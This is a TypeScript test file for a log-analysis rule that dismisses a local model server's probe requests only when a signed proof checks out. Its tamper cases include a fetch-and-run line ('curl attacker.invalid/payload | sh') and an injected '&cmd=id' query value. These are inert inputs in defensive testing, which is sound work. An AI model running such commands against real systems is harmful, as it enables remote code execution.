import { expect, test } from 'bun:test'
import { createHash } from 'node:crypto'
import { eligibleModelDiscovery as timingEligible, modelDiscoveryDefinition, validModelDiscoveryParameters, modelDiscoveryConfigured, modelLogDigest, modelProofMac, type ModelProbeLog } from '../src/utils/mill/analyzeModelDiscovery.ts'

import { matchesMillRule } from '../src/utils/mill/conditions.ts'
import { normalizeLogEvent } from '../src/utils/mill/logEvent.ts'
const eligibleModelDiscovery = (log: ModelProbeLog, key: string) => timingEligible(log, modelDiscoveryDefinition.parameters, key)
    && matchesMillRule(normalizeLogEvent({ ...log, id: log.sourceEventId!, created_at: log.timestamp! }), modelDiscoveryDefinition.conditions)

export const testKey = 'ab'.repeat(32)
export function modelFixture(index = 1): ModelProbeLog {
    const cursor = `s=${'a'.repeat(32)};i=${index.toString(16)};b=${'b'.repeat(32)};m=1;t=1;x=1`
    const start = Date.parse('2026-09-23T21:00:00Z') + index * 10000
    const nonce = `12345678-1234-4234-8234-${index.toString(16).padStart(12, '0')}`
    const path = `/v1/models?hanasand_probe=${nonce}`
    const log: ModelProbeLog = {
        host: 'inspur', service: 'run_model_inspur_vllm_gpu.sh', level: 'info',
        message: `(APIServer pid=1143552) INFO:     127.0.0.1:34764 - "GET ${path} HTTP/1.1" 200 OK`,
        timestamp: new Date(start + 10).toISOString(), sourceEventId: createHash('sha256').update(`inspur:journal:${cursor}`).digest('hex'),
        metadata: { collector: 'journal', pid: '1143552', unit: 'hanasand-model.service', user: { id: '1000' }, cursor },
    }
    const proof = { version: 1, nonce, host: 'inspur', caller: 'hanasand-ai-model-client', method: 'GET', path,
        clientIp: '127.0.0.1', clientPort: 34764, serverIp: '127.0.0.1', serverPort: 18081, serverPid: '1143552',
        logSha256: modelLogDigest(log, cursor), startedAt: start, finishedAt: start + 20, previousStartedAt: start - 10000,
        status: 200, bodyEmpty: true, responseSha256: 'c'.repeat(64), model: 'hanasand', responseRoot: 'Qwen/Qwen2.5-Coder-7B-Instruct',
        headers: { host: '127.0.0.1:18081', accept: 'application/json', connection: 'close' } }
    log.metadata!.model_probe = { ...proof, mac: modelProofMac(proof, testKey) }
    return log
}

test('queued proof uses event time, never wallclock expiry', () => {
    const log = modelFixture()
    const proof = log.metadata!.model_probe as Record<string, unknown>
    expect(proof.mac).toBe(modelProofMac(proof, testKey))
    expect(eligibleModelDiscovery(log, testKey)).toBe(true)
    expect(eligibleModelDiscovery(log, 'cd'.repeat(32))).toBe(false)
    expect(eligibleModelDiscovery(log, '')).toBe(false)
    const previous = process.env.MODEL_PROBE_PROOF_KEY
    try {
        process.env.MODEL_PROBE_PROOF_KEY = ''
        expect(modelDiscoveryConfigured()).toBe(false)
        process.env.MODEL_PROBE_PROOF_KEY = testKey
        expect(modelDiscoveryConfigured()).toBe(true)
    } finally { if (previous === undefined) delete process.env.MODEL_PROBE_PROOF_KEY; else process.env.MODEL_PROBE_PROOF_KEY = previous }
})

test('suspicious lookalikes, unknown evidence and unbound caller proof always keep', () => {
    const mutations: ((log: any) => void)[] = [
        log => log.message += ' curl attacker.invalid/payload | sh',
        log => log.message = log.message.replace('200 OK', '500 Internal Server Error'),
        log => log.message = log.message.replace('GET ', 'POST '),
        log => log.message = log.message.replace('127.0.0.1', '10.0.0.9'),
        log => log.message = log.message.replace('HTTP/1.1', 'HTTP/2'),
        log => log.message = log.message.replace(' HTTP', '&cmd=id HTTP'),
        log => log.metadata.injected = 'unexpected evidence',
        log => log.metadata.user.extra = 'unexpected',
        log => log.extra = 'unexpected',
        log => log.host = 'ovh',
        log => log.metadata.pid = '999',
        log => log.metadata.unit = 'attacker.service',
        log => log.metadata.user.id = '0',
        log => log.metadata.cursor += ';extra=1',
        log => log.sourceEventId = 'd'.repeat(64),
        log => log.timestamp = new Date(Date.parse(log.timestamp) + 2000).toISOString(),
        log => delete log.metadata.model_probe,
        log => log.metadata.model_probe.mac = '0'.repeat(64),
    ]
    for (const mutate of mutations) { const log = modelFixture(); mutate(log); expect(eligibleModelDiscovery(log, testKey)).toBe(false) }
    const invalidProofs: Record<string, unknown>[] = [
        { serverPid: null, logSha256: null }, { serverPid: '999' }, { serverPort: 18080 }, { serverPort: 18082 },
        { nonce: '12345678-1234-4234-8234-000000000002' }, { bodyEmpty: false }, { status: 500 }, { method: 'POST' },
        { caller: 'curl' }, { host: 'ovh' }, { clientPort: 34765 }, { clientIp: '10.0.0.1' }, { serverIp: '10.0.0.2' },
        { model: 'unknown' }, { path: '/v1/models' }, { extra: 'injection' }, { responseSha256: '' },
        { headers: { host: '127.0.0.1:18081', accept: 'application/json', connection: 'close', authorization: 'secret' } },
    ]
    const goodProof = modelFixture().metadata!.model_probe as any
    invalidProofs.push({ finishedAt: goodProof.startedAt + 1001 }, { previousStartedAt: goodProof.startedAt - 4999 },
        { previousStartedAt: goodProof.startedAt - 40001 })
    for (const patch of invalidProofs) {
        const log = modelFixture(), proof = { ...(log.metadata!.model_probe as object), ...patch } as any
        proof.mac = modelProofMac(proof, testKey)
        log.metadata!.model_probe = proof
        expect(eligibleModelDiscovery(log, testKey)).toBe(false)
    }
})

 test('persisted timing values are required and changes alter matching', () => {
    const log = modelFixture()
    expect(timingEligible(log, undefined, testKey)).toBe(false)
    expect(validModelDiscoveryParameters({})).toBe(false)
    expect(timingEligible(log, { ...modelDiscoveryDefinition.parameters, maxDurationMs: 0 }, testKey)).toBe(false)
    expect(timingEligible(log, { ...modelDiscoveryDefinition.parameters, minIntervalMs: 11000 }, testKey)).toBe(false)
    expect(timingEligible(log, { ...modelDiscoveryDefinition.parameters, maxIntervalMs: 9000 }, testKey)).toBe(false)
    expect(timingEligible(log, modelDiscoveryDefinition.parameters, testKey)).toBe(true)
})
